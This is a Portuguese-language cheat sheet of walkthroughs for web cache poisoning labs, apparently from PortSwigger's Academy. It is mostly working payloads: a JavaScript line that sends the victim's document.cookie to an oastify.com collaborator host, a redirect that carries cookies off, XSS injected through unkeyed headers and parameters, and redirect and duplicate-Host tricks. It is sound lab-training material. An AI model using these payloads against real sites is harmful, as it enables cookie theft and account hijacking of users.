# Web Cache Poisoning

Se você ver o header `X-Cache: hit` na resposta e a existência do arquivo `/resources/js/tracking.js`, provavelmente a aplicação está vulnerável a Web Cache Poisoning.

A primeira coisa a se testar quando ver esses recursos, é tentar refletir o domínio do exploit server atráves desses headers:
```
Host
X-Forwarded-Host
X-Host
X-Forwarded-Server
```

> [!IMPORTANT]
> Envie as requisições para envenenar o cache algumas vezes, pois o envenenamento pode não funcionar nas primeiras tentativas.

Se você conseguiu refletir o exploit server na resposta, vá para o servidor, mude o nome do arquivo para `/resources/js/tracking.js` e coloque um payload para roubar o cookie da vítima no Body.
```
document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
```

<br>

## Laboratórios

**Web Cache Poisoning with an Unkeyed Header**

Nesse caso você pode usar a exploração indicada acima ou colocar o payload direto no header.
```
X-Forwarded-Host: test.com"></script><script>alert(document.cookie)</script>//
```

<br>
<br>

**Web Cache Poisoning with an Unkeyed Cookie**
```
fehost=someString"-alert(1)-"someString
```

<br>
<br>

**Web Cache Poisoning with Multiple Headers**

Use a extensão Param Miner para identificar o header `X-Forwarded-Scheme`. Qualquer outro valor diferente de HTTPS vai retornar status 302 com um header `Location`.

Use esse header com o header `X-Forwarded-Host` para redirecionar o usuário para seu exploit server.
```
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0ab300bf03adb37181e4d360010c007b.exploit-server.net
```

<br>
<br>

**Targeted Web Cache Poisoning using an Unknown Header**

Use a extensão Param Miner para ver que o header **X-Host** está sendo refletido em:
```
<script type="text/javascript" src="//example.com/resources/js/tracking.js">
```

Observe que o header Vary especifica o User-Agent, então precisamos saber o browser da vítima.

A feature de comentário permite tags HTML, então podemos usar isso para enumerar o navegador dela.
```
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```

Agora podemos adicionar esse User-Agent na request para envenenar o cache corretamente.
```
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```

<br>
<br>

**Web Cache Poisoning via an Unkeyed Query String**

Observe que você ainda recebe a resposta como cacheada ao incluir parâmetros na URL, ou seja, eles não fazem parte do cache key.

Adicione um parâmetro que quebre a string refletida e injete um XSS:
```
GET /?evil='/><script>alert(1)</script>
```

Versão adaptada:
```
GET /?evil='/><script>document.location='https://c2fsr4s3dcy11k6m80vnarmyjppgd7gv5.oastify.com/?cookies';</script>
```

<br>
<br>

**Web Cache Poisoning via an Unkeyed Query Parameter**

Observe que você recebe um cache miss toda vez que muda um parâmetro da URL.

Utilize a função "Guess GET parameters" do Param Miner para identificar que o parâmetro `utm_content` é aceito pela aplicação.

Confira que esse parâmetro não é um cache key e insira o payload para quebrar a string refletida:
```
GET /?utm_content='/><script>alert(1)</script>
```

<br>
<br>

**Parameter Cloaking**
```
/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

<br>
<br>

**Web Cache Poisoning via a Fat GET Request**

Note que você pode mudar o nome da função a ser chamado passando o parâmetro `callback` usando uma Fat Request, mas a cache key ainda será o parâmetro da URL.
```
# REQUISIÇÃO
GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

# RESPOSTA
HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
```

<br>
<br>

**URL Normalization**

No Burp Repeater, navegue para um diretório inexistente como /random e observe que o caminho requisitado é refletido na mensagem de erro.

Adicione o payload:
```
GET /random</p><script>alert(1)</script><p>foo
```

Observe que se você requisitar esse caminho direto pelo navegador, o payload não execute porque está encodado em URL.

No Burp Repeater, envenene o cache com o seu payload e imediatamente carregue a URL no navegador.

Dessa vez, o `alert()` foi executado porque o payload encodado pelo navegador foi decodado pelo cache, causando um cache hit com a request anterior.

<br>

### Outros

**Poison Ambiguous Request**
```
Host: TARGET.net
Host: exploit.net
```
